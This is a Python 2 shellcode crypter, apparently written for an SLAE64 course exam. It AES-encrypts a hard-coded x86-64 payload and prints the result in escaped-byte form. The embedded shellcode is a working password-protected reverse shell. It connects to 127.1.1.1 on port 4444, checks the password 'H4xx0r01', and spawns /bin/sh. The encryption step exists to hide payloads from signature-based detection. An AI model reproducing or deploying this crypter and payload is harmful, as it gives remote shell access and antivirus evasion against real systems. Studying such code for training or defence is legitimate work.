#!/usr/bin/env python

####################################################
#
# shellcode-crypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE64-1439
# November 8, 2016
#
####################################################

# Imports

from Crypto.Cipher import AES
import sys
#import argparse
import os
import hashlib


#---------------------------------------
#
# Define our Encryption Functions
#
#--------------------------------------

def aesCrypter(key, shellcode):
  salt = os.urandom(16)
  initVector = os.urandom(16)
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  encrypterObject = AES.new(hashedKey, mode, initVector)
  messageToEncrypt = shellcode
  cipherText = initVector + salt + encrypterObject.encrypt(messageToEncrypt)
  print "\n\n[+] RAW AES Encrypted Shellcode: \n%s" % cipherText.encode('hex')
  print "\nShellcode Length: %d" % len(cipherText)
  print "\nKey: %s" % key
  print "\nHashedkey: %s Len: %d" % (hashedKey.encode('hex'), len(hashedKey))
  print "\nSalt: %s Len: %d" % (salt.encode('hex'), len(salt))
  print "\nIV: %s Len: %d\n\n" % (initVector.encode('hex'), len(initVector))
  encShellcode = ''

  for i in bytearray(cipherText):
    encShellcode += '\\x%02x' % i

  print '\n[+] Encrypted Shellcode: "%s"\n\n' % encShellcode
  sys.exit(0)

def main():
  # Setup the argument parser

#  parser = argparse.ArgumentParser()
#  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
#  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
#  options = parser.parse_args()

  # Prepare some objects

#  key = options.key
#  shellcode = options.shellcode

  shellcode = "\x48\x31\xc0\xb0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x48\x83\xc2\x06\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x48\x31\xd2\xb2\x10\x48\x31\xf6\x56\xc7\x44\x24\xfc\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\x89\x74\x24\xf6\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x89\xe6\x0f\x05\x4d\x31\xc9\x49\x89\xf9\x4d\x31\xf6\x41\x56\x49\xbe\x48\x34\x78\x78\x30\x72\x30\x31\x41\x56\x49\x89\xe6\x48\x83\xec\x10\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x4c\x89\xcf\x6a\x01\x58\x48\x31\xf6\x56\x48\xbe\x73\x77\x6f\x72\x64\x3a\x20\x0a\x56\x48\xbe\x65\x72\x20\x61\x20\x50\x61\x73\x56\x48\xbe\x65\x61\x73\x65\x20\x45\x6e\x74\x56\x66\x68\x50\x6c\x48\x89\xe6\x48\x31\xd2\xb2\x1a\x0f\x05\x48\x31\xc0\x48\x31\xf6\x56\x48\x8d\x74\x24\xf0\x48\x31\xd2\x80\xc2\x10\x0f\x05\x4c\x89\xf7\x48\xa7\x74\x02\x75\xaa\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x56\x66\x68\x2d\x69\x4d\x31\xd2\x49\x89\xe2\x56\x41\x52\x57\x48\x89\xe6\x48\x31\xd2\x52\x48\x89\xe2\x0f\x05" 

  key = 'slae64'

  while (len(shellcode) % 16 !=0):
    shellcode += "\x90"

  aesCrypter(key, shellcode)


if __name__ == "__main__":
  main()
